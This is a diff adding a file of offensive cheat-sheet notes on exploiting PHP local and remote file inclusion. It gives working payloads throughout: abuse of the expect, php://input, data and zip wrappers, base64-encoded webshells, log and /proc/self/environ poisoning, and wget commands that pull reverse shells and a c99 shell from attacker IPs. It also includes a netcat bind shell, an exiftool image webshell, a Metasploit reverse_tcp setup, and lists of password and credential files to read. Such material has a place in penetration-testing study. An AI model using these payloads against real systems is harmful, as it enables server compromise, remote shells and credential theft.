@@ -1,0 +1,234 @@
+This attack is based on the ability to read files freely remotely from the target system.
+In the PHP environment, the attack usually consists of:
+• poisoning log files,
+• injecting malicious code in the "user agent header",
+• or use the file “/proc/self/environ”.
+
+In a situation where we deal with a PHP environment,
+ we can use the built-in "PHP wrappers" to facilitate our goal or bypass existing filters. 
+ The most popular methods:
+ •	expect://
+•	php://input
+•	php://filter
+•	data://”
+•	php://zip
+
+
+--------------------------CHECK phpinfo.php----------------
+
+It is always worth checking the phpinfo.php file for two parameters.
+- allow_url_fopen = on - allows you to treat URL (http: // or ftp: //) as files.
+- allow_url_include = on - allows include / require URL (http: // or ftp: //) as files.
+
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+1. PHP expect: // wrapper allows execution of system commands, it is turned off by default.
+Example:
+http://127.0.0.1/fileincl/example1.php?page=expect://ls
+
+In case this wrapper is disabled we will see the following error:
+Warning: include (): Unable to find the wrapper "expect"….
+
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+2.	PHP php://input wrapper (allow_url_include=On)
+It allows you to redirect data sent with the post method as an argument and
+ thanks to the Include function we can attach the sent data and execute it.
+
+- Burp Suite,
+- Hack Bar add-on for firefox,
+- http://192.168.183.128/fileincl/example1.php?page=php://input
+- <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
+
+- Curl 
+- curl http://xxx.xxx.index.php?view=php://input –d “ <?php system(‘id’); ?>” 
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+3.	PHP php://filter wrapper 
+It allows you to attach local files and display them in base64 encoded format.
+Example of use:
+vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+4.	PHP data:text/plain wrapper (allow_url_include=On)
+It allows you to include PHP code via stream data.
+Example of use:
+
+http://www.site.com/lfi.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
+http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+5.	PHP zip:// wrapper
+ZIP wrapper allows processing of uploded zip files on the server side. So we can upload the .zip file and run it with the wrapper.
+• - Prepare PHP erverse shell
+• - Compress to a .zip file
+• - Upload to the server
+• - Use a wrapper to extract the file using:
+php?page=zip://path/to/file.zip%23shell
+• - If server does not add .php rename manually
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+6.	/proc/self/environ LFI
+If it is possible to attach the proc / self / environ file on the attacking machine, then it can inject malicious code by manipulating the field in the "User Agent" header.
+For this task we can use Tamper Data add-on for Firefox and change the value in the field  User-Agent. 
+•	www.website.com/view.php?page=../../../../../proc/self/environ
+•	<?system('wget http://192.168.43.159/download/c99.txt -O shell.php');?>
+•	www.website.com/shell.php
+Put the shell into the / tmp / directory if there are problems with permissions.
+Another example would be establishing a session using ncat:
+<?system('nc -lvp 1221 -e /bin/bash ');?>
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+7.	/proc/self/fd/ LFI
+If it is possible to attach the proc /self/fd file on the attacked machine, then by manipulating the field in the header "REFERER" it can inject malicious code.
+This method is difficult because the Apache buggy file /proc/self/fd / changes its location 
+- /proc/self/fd
+- /proc/self/fd2
+
+Therefore, it is a good idea to brute force first with Burp Intruder and, given the file size, discover which file is correct.
+A file containing the names of the files:
+https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+8.	LFI Image PHP code
+Using the exiftool utility, we can add PHP code to the image metadata that will allow the execution of system commands on the server side.
+Then, using the LFI gap, we include the image.
+exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler();" /root/picture.jpeg
+The \$_GET'cmd'); code is what reads our command, and the _halt_compiler();prevents the file-checking system from reading on with the binary data.
+Our file name np. picture.php.jpeg
+https://null-byte.wonderhowto.com/how-to/upload-shell-web-server-and-get-root-rfi-part-1-0162818/
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+9.	SSH Log Poisoning
+If it is possible to attach the /var/log/auth.log file, we can try to connect to initiate an SSH connection as given below:
+ssh '<?php echo system($_GET["cmd"]); exit; ?>'@[HOST]
+And then try to attach a file /var/log/auth.log&cmd= nc IP:PORT –e /bin/bash
+At the same time, we need to put nc in listening mode.
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+10. FIMAP
+Fimap uses the temporary creation of PHP files by locally including files and misusing the disclosure information with PHPinfo ().
+If the phpinfo () file is present you can usually get a shell, if you don't know the location of the phpinfo file then fimap can probe, or you can use a tool like OWASP DirBuster.
+Sample PHP code for loading files on the page:
+
+<?php
+ $file = $_GET['file'];
+ if(isset($file))
+    {
+      include("pages/$file");
+    }
+ else
+    {
+      include("index.php");
+    }
+?>
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+11.	Truncation LFI Bypass
+- http://$ip/index.php?page=/etc/passwd
+- http://$ip/index.php?file=../../../../etc/passwd
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+12.	Methods of attaching external files in PHP:
+
+-include - includes something in the file where include components occur, in case of error or missing file it is treated as warning and the code is still executable.
+- include_once - include something in the file where it occurs. If you try to re-attach the same data, this directive will be ignored in the event of an error or missing file, it is treated as a warning and the code is still executable.
+- require - append something to the file where it occurs. As required data is considered a fatal error when an error occurs.
+- require_once - append something to the file where it occurs. If you try to attach the same data again, this directive will be ignored. As required data is considered a fatal error when an error occurs.
+
+
+///////////////////////////////////////////////// ////////////////////////////////////////////////// ///////////////
+13. Null Byte Technique
+NULL BYTE injection allows you to bypass application WEB filters by adding encoding the empty character as %00. 
+This is very much a way to bypass the filename + "php" filters. Empty character allows us to omit the code fragments that follow.
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+14.	Useful files Linux File Locations
+– /etc/issue
+– /etc/profile
+– /etc/passwd
+– /etc/shadow
+– /proc/version
+- /proc/self/environ
+– /root/.bash_history
+– /var/log/dmessage
+– /var/mail/root
+– /var/spool/cron/crontabs/root
+-  /var/log/mail/USER
+- /var/log/apache2/access.log
+- /tmp/sess_ID and /var/lib/php5/sess_ID
+- Uploaded file path. (if you don’t know it checks at /tmp and the default upload paths of every server and CMS). phpinfo() will also help for such information.
+- /var/log/auth.log
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+15.	Windows File Locations
+– %SYSTEMROOT%\repair\system
+– %SYSTEMROOT%\repair\SAM
+– %SYSTEMROOT%\repair\SAM
+– %WINDIR%\win.ini
+– %SYSTEMDRIVE%\boot.ini
+– %WINDIR%\Panther\sysprep.inf
+– %WINDIR%\system32\config\AppEvent.Evt
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+16.	OS X/macOS File Locations:
+– /etc/fstab
+– /etc/master.passwd
+– /etc/resolv.conf
+– /etc/sudoers
+– /etc/sysctl.conf
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+17.	LFI useful files for Brute-Force
+https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+18.	 Metasploit for LFI
+http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
+
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 1
+msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)> set lhost 192.168.1.123
+msf exploit (web_delivery)>set srvport  8081
+msf exploit (web_delivery)>exploit
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction
+http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
